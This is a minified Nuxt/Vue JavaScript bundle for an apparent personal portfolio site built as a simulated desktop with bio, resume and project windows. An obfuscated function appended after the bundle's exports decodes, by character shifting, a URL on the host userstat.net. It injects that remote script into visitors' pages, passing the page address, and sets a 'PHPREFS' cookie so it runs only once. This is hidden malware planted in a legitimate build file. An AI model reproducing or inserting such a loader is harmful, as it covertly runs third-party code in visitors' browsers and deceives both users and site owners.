    "data:image/webp;base64,UklGRl4FAABXRUJQVlA4IFIFAABQTQCdASq4AbgBPtForVKoKqSnobH4SVAaCWlu3Mx2p+KnlzFMBMdFzXX835InUUsyU3pz0YDQrG7tNBljEJJkVqR/56nIOzgdyQduZCdYN6DLTixEyLBvQiZFg3oRMiwb0ImCy8IArD1OZKPFqzzpm3yuT25Wli9IjWye6srNiJCLCJNRpT1Hanagol+Y+Na0Bw/Xet2i/66A1AR7O21MpYR5Yf5d4f5WcPo3HOQFDmVlPo1G1xHc/3279Ak4nazKgH+V+gaa05QSSwjatP2o8zVx6Ptp2KHEp6P3oKQILVXZmQW724+QP7mU6vXd8p8pTN4vvk7c/MPuRKAQSI+Vds0ziHEHdBIVRQmGIh/vXnfKUzOBwfetBirg7Nya0PqaATE78wfvsPoKJ4HWHMyDMKfk/NXYh0q0mbCYsJaA9yo09gk4nayjdsvylfRts2riQu7UqNDVu2DtA7TVCvucxPxUQot3+NCP/2H6J+PrQnx7/oPnLY9B5w5SQi0ANJ1hLqjMJFFvdFm68zeI/IXDjETL3gevkmY3+EL5CVCM5U6MtQzr6hKhCxvNUlHYDw9d41VE0MzHBSEWEKoFTC5JeAX921LRmRAlR7mY9H8udVSaR7V2SBkzhypxBIspM0qRf9anaZFyrMiBKj8r4N0yM1cEEtPROx+JgdgkhYP93fIUtUUC71zI3w8SZUBGf2/ym30PuIqaaWppktgDhB3DydkpG0xxwRuDiSUs/9EdhDEt5WK4lD2fdg8wqahLFlNLZ2+awBRPohdxR5Wsw+XIgBwg7h5OyPPQswOcn1zdIDxwyWJfo5D526MY7rnqK9MpqAAA/vaT5PQf+nhIG3Cg9R74RQGNKJFwfZ+JwQB1u9AK2AXuZKf7wt0bjEK7ZbGbYz6ficpLVKU8On8UXgv8GA8gFgfZWxNVQuYE6eGYZNzPTT2VZj9zIGVCPFHTG7ig7LfE4m1HiPWTW4X2llcMLmyVaRTAIhGlEMgKeu6rWFZoM7tvDXPmGs+KBy+hc5PlxKVEjaHDK1f5KjnjRdEqT25QD6beolkbPv7FqVhBYwQ/NVIrlwRvhw6kHNYq/OoD832uWAp1gS552v2S7usX0kkOlESADOgrabJaSPkBUXa6dJdyjLVdzOUkbaYKvvAKMztQVWv2kSdVVQQttwB1Qh389vNRaPLnm8pk5gbY90xcr6nJolVUKIJF9OWt9WtjkweRdXln3Ix4EqfElo5pwYTFZhThU+i3338ctLw3DLihQq+CsxTLanYKBWAZc7r9od7fIgCQrF0zO5NgY8YhEFAwOFpRypjrCnUaaKiEasjiT+Xr4qUh0JnABnJrLfMJHDAKjxUExTV2TwMIHBImqlrspe7fD4fDnW/fnXlC7bWSqtCwdFmh/G8xQqLIoUcndaVdp/HLM68yfQznKXWmm2aes08ufk7JNawnaU8ns/N3/4iRvENSppTj773QS9Uwj/RcRfQGodmEG/KszvRZ90nIy6YvFR3AkFfujHg1f+6n4Ag9T/70TWnJIkJyuUa1SS2XR9ZrZcOHcL8dn2qpF3cqqtPdYqfkNfdZYJQeNGVTNdF14PeAf7ATYditSHRHi4eL4WHV5cblxmXIyy56y1caKs1oCOQSLSlpFofpbFqqqrN1PBy4qagu3kB/E+lVe9IsibioCbA9X4iCHx34tQoHdBueCVCeKb54L2Ab8o2A8pr6AQYV8xzPiWhgVSkoLFjrFFXR8U9Ckg6vxUAJUJQqekp5N2POGahWKYLbdKvJqO9KlS2Qlcn1NYqgNzn/JUUWo5yXVvDzw5GpizUAAAA=",
  RM = {},
  CM = { class: "menu", style: { "z-index": "1000000" } },
  WM = Zt(
    '<div class="sidebar" data-v-23173a58><img class="sidebar-image" src="' +
      SM +
      '" data-v-23173a58></div><div class="socials" data-v-23173a58><a href="https://www.instagram.com/_dontax_/" target="_blank" data-v-23173a58></a><a href="https://www.reddit.com/user/satoshigekkouga2303" target="_blank" data-v-23173a58></a><a href="https://www.linkedin.com/in/don-chia" target="_blank" data-v-23173a58></a><a href="https://x.com/solanajews" target="_blank" data-v-23173a58><div class="bar" data-v-23173a58><img class="social-image" src="' +
      DM +
      '" data-v-23173a58><u data-v-23173a58>T</u>witter </div></a><a href="https://github.com/DonChiaQE" target="_blank" data-v-23173a58></a><div class="divider" data-v-23173a58></div><a href="/images/well.pdf" target="_blank" data-v-23173a58><div class="bar" data-v-23173a58><img class="social-image" src="' +
      cf +
      '" data-v-23173a58><u data-v-23173a58>W</u>ell well well </div></a><div class="bar" data-v-23173a58><img class="social-image" src="' +
      2
  ),
  GM = [WM];
function FM(e, t) {
  return ve(), Ie("div", CM, GM);
}
const LM = Ot(RM, [
    ["render", FM],
    ["__scopeId", "data-v-23173a58"],
  ]),
  jM = { id: "app" },
  NM = ["aria-label"],
  BM = {
    __name: "app",
    setup(e) {
      const t = Yn(),
        n = t.windows,
        o = [
          { name: "window", comp: IA },
          { name: "ImagePreviewWindow", comp: MM },
          { name: "mail", comp: tb },
          { name: "FilesWindow", comp: bA },
        ],
        i = [
          { name: "bio", comp: G1 },
          { name: "resume", comp: H1 },
          { name: "nossaflex", comp: rP },
          { name: "wwdc2021", comp: yP },
          { name: "wwdc2022", comp: kP },
          { name: "wwdc2023", comp: uM },
        ],
        a = (p) => {
          if ("open" == t.getWindowById(p).windowState) return !0;
        },
        u = () => {
          "Menu" == t.activeWindow &&
            (t.setActiveWindow(""), t.zIndexIncrement(""));
        };
      return (
        hn(() => {
          let v = document.getElementById("navbar").clientHeight;
          (document.getElementById("screen").style.height =
            window.innerHeight - v + "px"),
            window.addEventListener("resize", () => {
              let y = 0.01 * window.innerHeight;
              document.documentElement.style.setProperty("--vh", `${y}px`);
            }),
            ((p) => {
              const v = { windowState: "open", windowId: p };
              t.setWindowState(v);
            })("BiographyWindow");
        }),
        (p, v) => (
          ve(),
          Ie("div", jM, [
            L("div", { class: "screen", id: "screen", onClick: u }, [
              (ve(!0),
              Ie(
                ot,
                null,
                gi(
                  De(n),
                  (y) => (
                    ve(),
                    Ie(
                      "div",
                      { key: y.key, "aria-label": y.displayName },
                      [
                        a(y.windowId)
                          ? (ve(),
                            Ft(
                              Zs(
                                o.find((w) => w.name === y.windowComponent).comp
                              ),
                              {
                                key: 0,
                                nameOfWindow: y.windowId,
                                content_padding_bottom:
                                  y.windowContentPadding.bottom,
                                content_padding_left:
                                  y.windowContentPadding.left,
                                content_padding_right:
                                  y.windowContentPadding.right,
                                content_padding_top: y.windowContentPadding.top,
                                id: y.windowId,
                                style: Pt({
                                  position: y.position,
                                  left: y.positionX,
                                  top: y.positionY,
                                }),
                                folderContent: y.folderContent,
                                folderSize: y.folderSize,
                              },
                              {
                                content: Fa(() => [
                                  (ve(),
                                  Ft(
                                    Zs(
                                      i.find((w) => w.name === y.windowContent)
                                        .comp
                                    )
                                  )),
                                ]),
                                _: 2,
                              },
                              1032,
                              [
                                "nameOfWindow",
                                "content_padding_bottom",
                                "content_padding_left",
                                "content_padding_right",
                                "content_padding_top",
                                "id",
                                "style",
                                "folderContent",
                                "folderSize",
                              ]
                            ))
                          : so("", !0),
                      ],
                      8,
                      NM
                    )
                  )
                ),
                128
              )),
              Qe(x1),
            ]),
            "Menu" == De(t).activeWindow
              ? (ve(),
                Ft(LM, {
                  key: 0,
                  style: {
                    position: "absolute",
                    "z-index": "9999",
                    left: "0",
                    bottom: "36px",
                  },
                }))
              : so("", !0),
            Qe(v1, {
              style: { position: "absolute", bottom: "0", "z-index": "9999" },
              id: "navbar",
            }),
          ])
        )
      );
    },
  },
  JM = BM,
  zM = {
    __name: "nuxt-error-page",
    props: { error: Object },
    setup(e) {
      const n = e.error;
      n.stack &&
        n.stack
          .split("\n")
          .splice(1)
          .map((w) => ({
            text: w.replace("webpack:/", "").replace(".vue", ".js").trim(),
            internal:
              (w.includes("node_modules") && !w.includes(".cache")) ||
              w.includes("internal") ||
              w.includes("new Promise"),
          }))
          .map(
            (w) =>
              `<span class="stack${w.internal ? " internal" : ""}">${
                w.text
              }</span>`
          )
          .join("\n");
      const o = Number(n.statusCode || 500),
        i = 404 === o,
        a = n.statusMessage ?? (i ? "Page Not Found" : "Internal Server Error"),
        u = n.message || n.toString(),
        y = vc(
          i
            ? () =>
                Vc(
                  () => import("./DK0Z3iS4.js"),
                  __vite__mapDeps([0, 1]),
                  import.meta.url
                ).then((w) => w.default || w)
            : () =>
                Vc(
                  () => import("./Bhgf-dOP.js"),
                  __vite__mapDeps([2, 1]),
                  import.meta.url
                ).then((w) => w.default || w)
        );
      return (w, x) => (
        ve(),
        Ft(
          De(y),
          Lp(
            md({
              statusCode: De(o),
              statusMessage: De(a),
              description: De(u),
              stack: De(undefined),
            })
          ),
          null,
          16
        )
      );
    },
  },
  YM = zM,
  UM = {
    __name: "nuxt-root",
    setup(e) {
      const t = () => null,
        n = it(),
        o = n.deferHydration();
      if (n.isHydrating) {
        const f = n.hooks.hookOnce("app:error", o);
        Ai().beforeEach(f);
      }
      const i = !1;
      od(Nd, Bd()), n.hooks.callHookWith((f) => f.map((p) => p()), "vue:setup");
      const a = qa();
      $u((f, p, v) => {
        if (
          (n.hooks
            .callHook("vue:error", f, p, v)
            .catch((y) => console.error("[nuxt] Error in `vue:error` hook", y)),
          _y(f) && (f.fatal || f.unhandled))
        )
          return n.runWithContext(() => Ay(f)), !1;
      });
      const u = !1;
      return (f, p) => (
        ve(),
        Ft(
          Tg,
          { onResolve: De(o) },
          {
            default: Fa(() => [
              De(a)
                ? (ve(),
                  Ft(De(YM), { key: 0, error: De(a) }, null, 8, ["error"]))
                : De(u)
                ? (ve(),
                  Ft(De(t), { key: 1, context: De(u) }, null, 8, ["context"]))
                : De(i)
                ? (ve(), Ft(Zs(De(i)), { key: 2 }))
                : (ve(), Ft(De(JM), { key: 3 })),
            ]),
            _: 1,
          },
          8,
          ["onResolve"]
        )
      );
    },
  },
  du = UM;
let fu;
{
  let e;
  (fu = async function () {
    var u, f;
    if (e) return e;
    const o =
        (null != (u = window.__NUXT__) && u.serverRendered) ||
        "true" ===
          (null == (f = document.getElementById("__NUXT_DATA__"))
            ? void 0
            : f.dataset.ssr)
          ? $m(du)
          : Km(du),
      i = oy({ vueApp: o });
    async function a(p) {
      await i.callHook("app:error", p),
        (i.payload.error = i.payload.error || Ka(p));
    }
    o.config.errorHandler = a;
    try {
      await ry(i, Bw);
    } catch (p) {
      a(p);
    }
    try {
      await i.hooks.callHook("app:created", o),
        await i.hooks.callHook("app:beforeMount", o),
        o.mount(gw),
        await i.hooks.callHook("app:mounted", o),
        await Dr();
    } catch (p) {
      a(p);
    }
    return o.config.errorHandler === a && (o.config.errorHandler = void 0), o;
  }),
    (e = fu().catch((t) => {
      throw (console.error("Error while mounting app:", t), t);
    }));
}
export {
  Fa as A,
  mi as B,
  Bn as C,
  Jn as D,
  QM as E,
  VM as F,
  Zi as G,
  Fg as H,
  Gg as I,
  fa as J,
  vm as K,
  Ot as _,
  $d as a,
  nu as b,
  co as c,
  Xu as d,
  Bg as e,
  ZM as f,
  Pm as g,
  Fo as h,
  HM as i,
  Fr as j,
  xd as k,
  vr as l,
  it as m,
  XM as n,
  hn as o,
  wi as p,
  wy as q,
  Me as r,
  Qa as s,
  ve as t,
  Ai as u,
  Ie as v,
  sa as w,
  L as x,
  xt as y,
  Qe as z,
};
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
